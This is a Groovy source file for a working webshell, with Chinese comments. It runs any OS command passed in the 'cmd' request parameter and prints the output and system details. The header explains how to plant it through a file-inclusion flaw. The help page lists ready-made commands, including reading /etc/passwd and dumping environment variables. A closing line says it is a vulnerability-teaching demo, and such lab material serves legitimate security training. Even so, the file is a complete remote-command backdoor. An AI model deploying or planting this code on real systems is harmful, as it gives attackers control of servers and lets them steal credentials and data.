/**
 * 基础 Groovy Webshell
 * 类似 PHP: <?php system($_GET['cmd']); ?>
 * 
 * 使用方法:
 * 1. 上传此文件到服务器
 * 2. 通过文件包含漏洞加载: /fileInclusion/groovy/vuln?file=shell.groovy
 * 3. 执行命令: /fileInclusion/groovy/vuln?file=shell.groovy&cmd=whoami
 */

// 获取命令参数（类似 $_GET['cmd']）
def cmd = request.getParameter("cmd")

if (cmd) {
    // 输出HTML头部
    out.println("<html><head><meta charset='UTF-8'><title>Groovy Webshell</title>")
    out.println("<style>")
    out.println("body { font-family: 'Courier New', monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }")
    out.println("h2 { color: #4ec9b0; border-bottom: 2px solid #4ec9b0; padding-bottom: 10px; }")
    out.println(".cmd { background: #2d2d2d; padding: 15px; border-radius: 5px; margin: 15px 0; }")
    out.println(".output { background: #000; color: #0f0; padding: 15px; border-radius: 5px; white-space: pre-wrap; font-size: 14px; }")
    out.println(".success { color: #4ec9b0; }")
    out.println(".error { color: #f48771; }")
    out.println("</style></head><body>")
    
    out.println("<h2>✅ Groovy Webshell - 命令执行成功</h2>")
    
    try {
        // 执行系统命令
        def process = cmd.execute()
        process.waitFor()
        
        // 读取标准输出
        def output = process.in.text
        
        // 读取标准错误
        def error = process.err.text
        
        // 获取退出代码
        def exitCode = process.exitValue()
        
        // 显示执行的命令
        out.println("<div class='cmd'>")
        out.println("<strong>执行命令:</strong> <code>${cmd}</code>")
        out.println("</div>")
        
        // 显示输出
        out.println("<div class='output'>")
        
        if (output) {
            out.println("<span class='success'>[标准输出]</span>")
            out.println(output)
        }
        
        if (error) {
            out.println("<span class='error'>[标准错误]</span>")
            out.println(error)
        }
        
        if (!output && !error) {
            out.println("<span style='color: #808080;'>命令执行成功，无输出内容</span>")
        }
        
        out.println("\n<span style='color: #569cd6;'>退出代码: ${exitCode}</span>")
        out.println("</div>")
        
        // 显示系统信息
        out.println("<div style='margin-top: 20px; padding: 10px; background: #2d2d2d; border-radius: 5px;'>")
        out.println("<strong>系统信息:</strong><br/>")
        out.println("OS: ${System.getProperty('os.name')}<br/>")
        out.println("Java版本: ${System.getProperty('java.version')}<br/>")
        out.println("工作目录: ${System.getProperty('user.dir')}<br/>")
        out.println("当前时间: ${new Date()}")
        out.println("</div>")
        
    } catch (Exception e) {
        out.println("<h2 class='error'>❌ 命令执行失败</h2>")
        out.println("<div class='output error'>")
        out.println("错误信息: ${e.message}")
        out.println("\n堆栈跟踪:")
        e.printStackTrace(new PrintWriter(out))
        out.println("</div>")
    }
    
    out.println("</body></html>")
    
} else {
    // 未提供命令参数，显示帮助信息
    out.println("<html><head><meta charset='UTF-8'><title>Groovy Webshell</title>")
    out.println("<style>")
    out.println("body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }")
    out.println("h2 { color: #333; }")
    out.println(".help { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }")
    out.println("code { background: #f0f0f0; padding: 2px 5px; border-radius: 3px; }")
    out.println("a { color: #0066cc; text-decoration: none; }")
    out.println("a:hover { text-decoration: underline; }")
    out.println("ul { line-height: 1.8; }")
    out.println("</style></head><body>")
    
    out.println("<div class='help'>")
    out.println("<h2>🚀 Groovy Webshell</h2>")
    out.println("<p>使用方法: <code>?cmd=命令</code></p>")
    
    out.println("<h3>示例命令:</h3>")
    out.println("<ul>")
    out.println("<li><a href='?cmd=whoami'>whoami</a> - 查看当前用户</li>")
    out.println("<li><a href='?cmd=id'>id</a> - 查看用户ID和组</li>")
    out.println("<li><a href='?cmd=pwd'>pwd</a> - 查看当前目录</li>")
    out.println("<li><a href='?cmd=ls -la'>ls -la</a> - 列出文件</li>")
    out.println("<li><a href='?cmd=uname -a'>uname -a</a> - 查看系统信息</li>")
    out.println("<li><a href='?cmd=ps aux'>ps aux</a> - 查看进程列表</li>")
    out.println("<li><a href='?cmd=cat /etc/passwd'>cat /etc/passwd</a> - 读取密码文件</li>")
    out.println("<li><a href='?cmd=env'>env</a> - 查看环境变量</li>")
    out.println("</ul>")
    
    out.println("<h3>⚠️ 警告</h3>")
    out.println("<p style='color: red;'>此为漏洞演示环境，仅用于安全教学。请勿用于非法用途！</p>")
    out.println("</div>")
    
    out.println("</body></html>")
}

// 返回标识（用于Result返回）
return "Webshell executed"
